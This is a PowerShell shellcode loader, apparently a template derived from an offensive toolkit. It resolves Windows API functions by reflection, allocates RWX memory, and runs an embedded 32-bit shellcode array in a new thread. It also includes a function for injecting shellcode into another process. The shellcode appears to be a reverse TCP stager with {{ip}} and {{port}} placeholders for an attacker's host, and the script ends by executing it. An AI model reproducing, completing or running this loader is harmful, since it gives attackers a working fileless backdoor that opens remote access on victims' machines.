Set-StrictMode -Version 2.0
function Local:Get-DelegateType
{
	Param
	(
		[OutputType([Type])]
		
		[Parameter( Position = 0)]
		[Type[]]
		$Parameters = (New-Object Type[](0)),
		
		[Parameter( Position = 1 )]
		[Type]
		$ReturnType = [Void]
	)

	$Domain = [AppDomain]::CurrentDomain
	$DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
	$AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
	$TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
	$ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
	$MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
	$MethodBuilder.SetImplementationFlags('Runtime, Managed')
	
	Write-Output $TypeBuilder.CreateType()
}

function Local:Get-ProcAddress
{
	Param
	(
		[OutputType([IntPtr])]
	
		[Parameter( Position = 0, Mandatory = $True )]
		[String]
		$Module,
		
		[Parameter( Position = 1, Mandatory = $True )]
		[String]
		$Procedure
	)

	# Get a reference to System.dll in the GAC
	$SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
		Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
	$UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
	# Get a reference to the GetModuleHandle and GetProcAddress methods
	$GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
	$GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
	# Get a handle to the module specified
	$Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
	$tmpPtr = New-Object IntPtr
	$HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
	
	# Return the address of the function
	Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
}

# Emits a shellcode stub that when injected will create a thread and pass execution to the main shellcode payload
function Local:Emit-CallThreadStub ([IntPtr] $BaseAddr, [IntPtr] $ExitThreadAddr, [Int] $Architecture)
{
	$IntSizePtr = $Architecture / 8

	function Local:ConvertTo-LittleEndian ([IntPtr] $Address)
	{
		$LittleEndianByteArray = New-Object Byte[](0)
		$Address.ToString("X$($IntSizePtr*2)") -split '([A-F0-9]{2})' | ForEach-Object { if ($_) { $LittleEndianByteArray += [Byte] ('0x{0}' -f $_) } }
		[System.Array]::Reverse($LittleEndianByteArray)
		
		Write-Output $LittleEndianByteArray
	}
	
	$CallStub = New-Object Byte[](0)
	
	if ($IntSizePtr -eq 8)
	{
		[Byte[]] $CallStub = 0x48,0xB8                      # MOV   QWORD RAX, &shellcode
		$CallStub += ConvertTo-LittleEndian $BaseAddr       # &shellcode
		$CallStub += 0xFF,0xD0                              # CALL  RAX
		$CallStub += 0x6A,0x00                              # PUSH  BYTE 0
		$CallStub += 0x48,0xB8                              # MOV   QWORD RAX, &ExitThread
		$CallStub += ConvertTo-LittleEndian $ExitThreadAddr # &ExitThread
		$CallStub += 0xFF,0xD0                              # CALL  RAX
	}
	else
	{
		[Byte[]] $CallStub = 0xB8                           # MOV   DWORD EAX, &shellcode
		$CallStub += ConvertTo-LittleEndian $BaseAddr       # &shellcode
		$CallStub += 0xFF,0xD0                              # CALL  EAX
		$CallStub += 0x6A,0x00                              # PUSH  BYTE 0
		$CallStub += 0xB8                                   # MOV   DWORD EAX, &ExitThread
		$CallStub += ConvertTo-LittleEndian $ExitThreadAddr # &ExitThread
		$CallStub += 0xFF,0xD0                              # CALL  EAX
	}
	
	Write-Output $CallStub
}

function Local:Inject-RemoteShellcode ([Int] $ProcessID)
{
	# Open a handle to the process you want to inject into
	$hProcess = $OpenProcess.Invoke(0x001F0FFF, $false, $ProcessID) # ProcessAccessFlags.All (0x001F0FFF)
	
	if (!$hProcess)
	{
		Throw "Unable to open a process handle for PID: $ProcessID"
	}


	$Shellcode = $Shellcode32

	# Reserve and commit enough memory in remote process to hold the shellcode
	$RemoteMemAddr = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $Shellcode.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)
	
	if (!$RemoteMemAddr)
	{
		Throw "Unable to allocate shellcode memory in PID: $ProcessID"
	}
	
	Write-Verbose "Shellcode memory reserved at 0x$($RemoteMemAddr.ToString("X$([IntPtr]::Size*2)"))"

	# Copy shellcode into the previously allocated memory
	$WriteProcessMemory.Invoke($hProcess, $RemoteMemAddr, $Shellcode, $Shellcode.Length, [Ref] 0) | Out-Null

	# Get address of ExitThread function
	$ExitThreadAddr = Get-ProcAddress kernel32.dll ExitThread

   
		$CallStub = Emit-CallThreadStub $RemoteMemAddr $ExitThreadAddr 32
		

	# Allocate inline assembly stub
	$RemoteStubAddr = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $CallStub.Length, 0x3000, 0x40) # (Reserve|Commit, RWX)
	
	if (!$RemoteStubAddr)
	{
		Throw "Unable to allocate thread call stub memory in PID: $ProcessID"
	}
	
	Write-Verbose "Thread call stub memory reserved at 0x$($RemoteStubAddr.ToString("X$([IntPtr]::Size*2)"))"

	# Write 32-bit assembly stub to remote process memory space
	$WriteProcessMemory.Invoke($hProcess, $RemoteStubAddr, $CallStub, $CallStub.Length, [Ref] 0) | Out-Null

	# Execute shellcode as a remote thread
	$ThreadHandle = $CreateRemoteThread.Invoke($hProcess, [IntPtr]::Zero, 0, $RemoteStubAddr, $RemoteMemAddr, 0, [IntPtr]::Zero)
	
	if (!$ThreadHandle)
	{
		Throw "Unable to launch remote thread in PID: $ProcessID"
	}

	# Close process handle
	$CloseHandle.Invoke($hProcess) | Out-Null

	Write-Verbose 'Shellcode injection complete!'
}

function Local:Inject-LocalShellcode
{
		if ($Shellcode32.Length -eq 0)
		{
			Throw 'No shellcode was placed in the $Shellcode32 variable!'
			return
		}
		
		$Shellcode = $Shellcode32
		Write-Verbose 'Using 32-bit shellcode.'

	# Allocate RWX memory for the shellcode
	$BaseAddress = $VirtualAlloc.Invoke([IntPtr]::Zero, $Shellcode.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)
	if (!$BaseAddress)
	{
		Throw "Unable to allocate shellcode memory in PID: $ProcessID"
	}
	
	Write-Verbose "Shellcode memory reserved at 0x$($BaseAddress.ToString("X$([IntPtr]::Size*2)"))"

	# Copy shellcode to RWX buffer
	[System.Runtime.InteropServices.Marshal]::Copy($Shellcode, 0, $BaseAddress, $Shellcode.Length)
	
	# Get address of ExitThread function
	$ExitThreadAddr = Get-ProcAddress kernel32.dll ExitThread
	
	$CallStub = Emit-CallThreadStub $BaseAddress $ExitThreadAddr 32

	# Allocate RWX memory for the thread call stub
	$CallStubAddress = $VirtualAlloc.Invoke([IntPtr]::Zero, $CallStub.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)
	if (!$CallStubAddress)
	{
		Throw "Unable to allocate thread call stub."
	}
	
	Write-Verbose "Thread call stub memory reserved at 0x$($CallStubAddress.ToString("X$([IntPtr]::Size*2)"))"

	# Copy call stub to RWX buffer
	[System.Runtime.InteropServices.Marshal]::Copy($CallStub, 0, $CallStubAddress, $CallStub.Length)

	# Launch shellcode in it's own thread
	$ThreadHandle = $CreateThread.Invoke([IntPtr]::Zero, 0, $CallStubAddress, $BaseAddress, 0, [IntPtr]::Zero)
	if (!$ThreadHandle)
	{
		Throw "Unable to launch thread."
	}

	# Wait for shellcode thread to terminate
	$WaitForSingleObject.Invoke($ThreadHandle, 0xFFFFFFFF) | Out-Null
	
	$VirtualFree.Invoke($CallStubAddress, $CallStub.Length + 1, 0x8000) | Out-Null # MEM_RELEASE (0x8000)
	$VirtualFree.Invoke($BaseAddress, $Shellcode.Length + 1, 0x8000) | Out-Null # MEM_RELEASE (0x8000)

	Write-Verbose 'Shellcode injection complete!'
}

$PowerShell32bit = $true

[Byte[]] $Shellcode32 = @(0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,{{ip}}0x68,0x02,0x00,{{port}}0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x3f,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xe9,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xc3,0x01,0xc3,0x29,0xc6,0x75,0xe9,0xc3,0xbb,0xe0,0x1d,0x2a,0x0a,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x53,0xff,0xd5)

# Inject shellcode into the currently running PowerShell process
$VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
$VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])
$VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
$VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
$VirtualFreeDelegate = Get-DelegateType @([IntPtr], [Uint32], [UInt32]) ([Bool])
$VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
$CreateThreadAddr = Get-ProcAddress kernel32.dll CreateThread
$CreateThreadDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
$CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
$WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
$WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [Int32]) ([Int])
$WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)

Inject-LocalShellcode